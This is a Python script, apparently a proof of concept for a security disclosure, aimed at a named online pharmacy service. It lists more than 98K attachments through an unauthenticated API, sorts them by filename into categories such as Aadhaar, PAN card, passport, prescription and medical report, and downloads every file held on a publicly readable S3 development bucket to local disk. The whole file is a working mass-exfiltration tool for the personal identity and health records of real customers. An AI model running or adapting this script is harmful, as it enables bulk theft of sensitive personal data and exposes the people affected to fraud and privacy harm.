#!/usr/bin/env python3
"""
MedBasket Attachment PoC — Download ALL accessible files from S3 dev bucket.

Enumerates ALL 98K+ attachments, identifies which are on the publicly accessible
S3 dev bucket (techpepo-development-s3) vs CDN (media.medbasket.com), and downloads
everything from S3 dev (no auth needed). CDN files return 403 — metadata saved.

Skips: XLSX/XLS (store inventory spreadsheets) per scope.

Output:
  data/attachments/metadata.csv          — Full metadata for ALL files
  data/attachments/summary.json          — Categorized summary with counts
  data/attachments/downloads/            — Downloaded files from S3 dev bucket
  data/attachments/downloads/<category>/ — Organized by document type
"""

import os
import sys
import json
import csv
import time
import urllib.request
import urllib.error
import urllib.parse

API = "https://api.medbasket.com"
BATCH = 50
MAX_RETRIES = 3
RETRY_DELAY = 2

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = os.path.join(BASE_DIR, "data", "attachments")
DL_DIR = os.path.join(OUT_DIR, "downloads")

# MIME types to SKIP entirely (store inventory only)
SKIP_MIMES = {
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",  # XLSX
    "application/vnd.ms-excel",  # XLS
}

CATEGORIES = {
    "aadhaar":      ["aadhar", "aadhaar", "eaadhaar"],
    "pan_card":     ["pan card", "pan_card", "pancard"],
    "passport":     ["passport"],
    "prescription": ["prescription", "rx ", "rx.", "rx_"],
    "medical_report": ["report", "diagnosis", "lab_report", "blood test", "ecg", "mri",
                       "xray", "x-ray", "ct_scan", "discharge"],
    "medical_doc":  ["doctor", "medical", "health", "patient", "hospital", "consult"],
    "invoice":      ["invoice", "order-"],
    "license":      ["fssai", "license", "licence", "gst"],
    "resume":       ["resume", "cv ", "cv.", "cv_"],
    "scanned_doc":  ["scan", "adobe scan", "docscanner", "camscanner"],
}


def classify(filename):
    if not filename:
        return "other"
    lower = filename.lower()
    for category, keywords in CATEGORIES.items():
        for kw in keywords:
            if kw in lower:
                return category
    return "other"


def get_extension(mime, filename):
    """Get file extension from MIME type or filename."""
    if filename and "." in filename:
        return filename.rsplit(".", 1)[-1].lower()
    mime_map = {
        "image/jpeg": "jpg", "image/jpg": "jpg", "image/png": "png",
        "image/heic": "heic", "image/heif": "heif", "image/webp": "webp",
        "image/gif": "gif", "image/bmp": "bmp", "image/tiff": "tiff",
        "image/svg+xml": "svg", "application/pdf": "pdf",
    }
    return mime_map.get(mime, "bin")


def fetch_json(url, retries=MAX_RETRIES):
    for attempt in range(retries):
        try:
            req = urllib.request.Request(url)
            req.add_header("Accept", "application/json")
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(RETRY_DELAY)
            else:
                print(f"  [ERROR] {e}")
                return None


def download_file(url, dest_path):
    try:
        parsed = urllib.parse.urlparse(url)
        encoded_path = urllib.parse.quote(parsed.path, safe="/")
        safe_url = parsed._replace(path=encoded_path).geturl()
        req = urllib.request.Request(safe_url)
        with urllib.request.urlopen(req, timeout=60) as resp:
            if resp.status == 200:
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                with open(dest_path, "wb") as f:
                    f.write(resp.read())
                return os.path.getsize(dest_path)
    except Exception:
        pass
    return 0


def main():
    os.makedirs(OUT_DIR, exist_ok=True)
    os.makedirs(DL_DIR, exist_ok=True)

    print("=" * 60)
    print("MedBasket Attachment PoC — Full File Extraction")
    print("=" * 60)
    print()

    # Step 1: Get total count
    print("[1/5] Counting ALL attachments...")
    url = f"{API}/attachments?$limit=0"
    data = fetch_json(url)
    if not data:
        print("  Failed to reach API. Exiting.")
        sys.exit(1)

    total = data.get("total", 0)
    print(f"  Total attachments: {total:,}")
    print(f"  Skipping: XLSX/XLS (store inventory)")
    print()

    # Step 2: Enumerate ALL attachments
    print(f"[2/5] Enumerating all {total:,} attachments...")
    s3_dev_records = []   # downloadable
    cdn_records = []      # metadata only (403)
    skipped_xlsx = 0
    skip = 0

    while skip < total:
        url = f"{API}/attachments?$limit={BATCH}&$skip={skip}"
        data = fetch_json(url)
        if not data or "data" not in data:
            print(f"  [WARN] Failed at skip={skip}, retrying...")
            time.sleep(RETRY_DELAY)
            data = fetch_json(url)
            if not data or "data" not in data:
                skip += BATCH
                continue

        for rec in data["data"]:
            details = rec.get("objectDetails") or {}
            mime = (details.get("mimeType") or "").lower()
            obj_url = rec.get("objectUrl", "")

            # Skip store inventory spreadsheets
            if mime in SKIP_MIMES:
                skipped_xlsx += 1
                continue

            if "techpepo" in obj_url:
                s3_dev_records.append(rec)
            else:
                cdn_records.append(rec)

        skip += BATCH

        if skip % 2000 == 0 or skip >= total:
            pct = min(skip, total) / total * 100
            total_kept = len(s3_dev_records) + len(cdn_records)
            print(f"  {min(skip, total):,}/{total:,} ({pct:.0f}%) | S3 dev: {len(s3_dev_records):,} | CDN: {len(cdn_records):,} | skipped: {skipped_xlsx:,}")

    print()
    print(f"  S3 Dev Bucket (downloadable): {len(s3_dev_records):,}")
    print(f"  CDN (metadata only, 403):     {len(cdn_records):,}")
    print(f"  Skipped (XLSX/XLS):           {skipped_xlsx:,}")
    print()

    # Step 3: Classify all records
    print("[3/5] Classifying files...")
    categories = {}
    csv_rows = []
    s3_download_queue = []

    for rec in s3_dev_records + cdn_records:
        details = rec.get("objectDetails") or {}
        obj_url = rec.get("objectUrl", "")
        filename = details.get("originalFileName") or details.get("fileName") or "unknown"
        s3_key = details.get("fileName", "")
        size = details.get("size") or 0
        mime = (details.get("mimeType") or "").lower()
        doc_id = rec.get("_id", "")
        storage = "s3_dev" if "techpepo" in obj_url else "cdn"
        category = classify(filename)
        ext = get_extension(mime, filename)

        if category not in categories:
            categories[category] = {"s3_dev": 0, "cdn": 0, "total_size": 0, "files": []}
        categories[category][storage] += 1
        categories[category]["total_size"] += size
        if len(categories[category]["files"]) < 5:
            categories[category]["files"].append(filename)

        csv_rows.append({
            "id": doc_id,
            "filename": filename,
            "s3_key": s3_key,
            "size": size,
            "mime": mime,
            "category": category,
            "storage": storage,
            "url": obj_url,
        })

        if storage == "s3_dev":
            s3_download_queue.append({
                "id": doc_id, "filename": filename, "size": size,
                "mime": mime, "category": category, "url": obj_url, "ext": ext,
            })

    # Print breakdown
    print()
    print(f"  {'Category':<25} {'Total':>7} {'S3 Dev':>8} {'CDN':>8} {'Size':>12}")
    print("  " + "-" * 64)
    for cat in sorted(categories, key=lambda c: -(categories[c]["s3_dev"] + categories[c]["cdn"])):
        info = categories[cat]
        tot = info["s3_dev"] + info["cdn"]
        sz = info["total_size"]
        sz_str = f"{sz/1024/1024:.1f} MB" if sz > 1024*1024 else f"{sz/1024:.0f} KB"
        print(f"  {cat:<25} {tot:>7} {info['s3_dev']:>8} {info['cdn']:>8} {sz_str:>12}")
    print()

    # Save metadata CSV
    csv_path = os.path.join(OUT_DIR, "metadata.csv")
    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["id", "filename", "s3_key", "size",
                                                "mime", "category", "storage", "url"])
        writer.writeheader()
        writer.writerows(csv_rows)
    print(f"  Metadata CSV: {csv_path} ({len(csv_rows):,} rows)")

    # Save summary JSON
    summary = {
        "scan_date": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "total_files": len(csv_rows),
        "s3_dev_downloadable": len(s3_dev_records),
        "cdn_metadata_only": len(cdn_records),
        "skipped_xlsx": skipped_xlsx,
        "categories": {
            cat: {
                "count": info["s3_dev"] + info["cdn"],
                "s3_dev": info["s3_dev"],
                "cdn": info["cdn"],
                "total_size_bytes": info["total_size"],
                "samples": info["files"],
            }
            for cat, info in categories.items()
        },
    }
    summary_path = os.path.join(OUT_DIR, "summary.json")
    with open(summary_path, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"  Summary JSON: {summary_path}")
    print()

    # Step 4: Download ALL S3 dev bucket files
    total_dl = len(s3_download_queue)
    if total_dl > 0:
        print(f"[4/5] Downloading {total_dl:,} files from S3 dev bucket...")
        print(f"  (All files on S3 dev bucket are publicly accessible — no auth needed)")
        print()
        downloaded = 0
        failed = 0
        total_bytes = 0

        for i, item in enumerate(s3_download_queue, 1):
            cat_dir = os.path.join(DL_DIR, item["category"])
            os.makedirs(cat_dir, exist_ok=True)

            safe_name = item["filename"].replace("/", "_").replace("\\", "_")
            if not safe_name or safe_name == "unknown":
                safe_name = f"{item['id']}.{item['ext']}"
            dest = os.path.join(cat_dir, safe_name)

            # Avoid filename collisions
            if os.path.exists(dest):
                base, ext = os.path.splitext(dest)
                dest = f"{base}_{item['id'][:8]}{ext}"

            if os.path.exists(dest):
                downloaded += 1
                total_bytes += os.path.getsize(dest)
                continue

            nbytes = download_file(item["url"], dest)
            if nbytes > 0:
                downloaded += 1
                total_bytes += nbytes
                if downloaded % 50 == 0 or downloaded <= 10:
                    mb = total_bytes / 1024 / 1024
                    print(f"  [{downloaded:,}/{total_dl:,}] {mb:.1f} MB downloaded | latest: {item['category']}/{safe_name}")
            else:
                failed += 1
                if failed <= 20:
                    print(f"  [FAIL] {item['filename']} → {item['url'][:80]}...")

        print()
        print(f"  Downloaded: {downloaded:,}/{total_dl:,} files")
        print(f"  Total size: {total_bytes/1024/1024:.1f} MB")
        if failed:
            print(f"  Failed:     {failed:,}")
    else:
        print("[4/5] No S3 dev bucket files found.")

    # Step 5: CDN access check (sample)
    print()
    print(f"[5/5] CDN files: {len(cdn_records):,} files on media.medbasket.com")
    print(f"  These return HTTP 403 (CloudFront blocks direct access)")
    print(f"  Metadata + URLs saved in metadata.csv for evidence")
    print()

    # Final summary
    print("=" * 60)
    print("RESULTS")
    print("=" * 60)
    all_total = len(csv_rows)
    sens_count = sum(v["s3_dev"]+v["cdn"] for k,v in categories.items() if k != "other")
    print(f"  Total files enumerated:     {all_total:,}")
    print(f"  Sensitive files identified:  {sens_count:,}")
    print(f"  S3 dev files downloaded:     {len(s3_download_queue):,}")
    print(f"  CDN metadata captured:       {len(cdn_records):,}")
    print(f"  XLSX skipped:                {skipped_xlsx:,}")
    print()
    print(f"  Output directory: {OUT_DIR}")
    print(f"    metadata.csv    — All file metadata with URLs ({len(csv_rows):,} rows)")
    print(f"    summary.json    — Categorized summary")
    print(f"    downloads/      — Downloaded files by category")
    print()


if __name__ == "__main__":
    main()
